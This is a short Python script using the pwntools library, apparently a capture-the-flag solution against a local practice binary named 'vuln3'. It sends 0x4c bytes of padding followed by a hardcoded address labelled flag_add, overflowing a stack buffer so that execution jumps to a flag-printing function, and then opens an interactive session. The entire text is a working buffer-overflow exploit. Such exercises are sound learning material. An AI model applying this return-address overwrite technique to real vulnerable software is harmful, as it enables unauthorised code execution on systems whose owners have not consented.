from pwn import *

flag_add = 0x080485E6

a = process('./vuln3')
raw_input('Debug')
a.recvuntil('Give me a string and lets see what happens: ')

buf = 'a'*0x4c
buf += p32(flag_add)

a.sendline(buf)

a.interactive()